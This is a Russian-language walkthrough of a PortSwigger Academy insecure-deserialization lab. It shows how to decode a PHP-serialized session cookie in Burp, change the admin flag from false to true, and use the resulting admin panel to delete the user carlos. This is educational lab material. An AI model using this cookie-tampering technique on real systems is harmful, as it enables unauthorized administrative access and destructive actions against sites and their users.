Залогинимся под `wiener:peter`

Перейлем в `Proxy` -> `HTTP history`

Увидим, что при запросе 
```
POST /login
```
в ответ нам выдает куки 
```
Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d;
```
Воспользуемся панелью Inspector и разберем куки 

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Данная конструкция может быть описана как
```
O:4:"User" - An object with the 4-character class name "User"
2 - the object has 2 attributes
s:4:"name" - The key of the first attribute is the 4-character string "name"
s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
b:1 - The value of the second attribute is the boolean value true
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/1.%20Modifying%20serialized%20objects/pics%20for%20walkthrough/1.png)

Отправим запрос 
```GET /my-account?id=wiener```
в `Repeater`
и изменим 
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
на
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

и нажмем `apply changes`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/1.%20Modifying%20serialized%20objects/pics%20for%20walkthrough/2.png)

отправим запрос, и увидим, что нас впустило под админской панелью

на что указывает появившаяся панель `Admin panel` в графическом рендере

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/1.%20Modifying%20serialized%20objects/pics%20for%20walkthrough/3.png)

Изменим путь на `/admin`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/1.%20Modifying%20serialized%20objects/pics%20for%20walkthrough/4.png)

и удалим пользователя `carlos` как этого требует задание
```
GET /admin/delete?username=carlos
```
после всех редиректов получим уведомление об успешно выполненной лабораторной раьботе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/1.%20Modifying%20serialized%20objects/pics%20for%20walkthrough/5.png)
